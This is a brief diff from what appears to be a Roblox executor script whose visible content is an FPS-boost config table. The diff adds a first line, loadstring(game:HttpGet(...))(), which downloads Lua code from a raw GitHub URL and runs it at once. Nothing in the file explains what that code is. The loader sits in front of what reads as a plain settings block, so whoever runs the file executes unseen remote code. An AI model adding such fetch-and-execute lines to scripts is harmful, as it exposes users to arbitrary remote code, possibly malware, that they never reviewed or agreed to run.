@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/Optimal"))()
 getgenv().Config = {
     ["Boost FPS"] = true,
     ["FPS"] = 5,
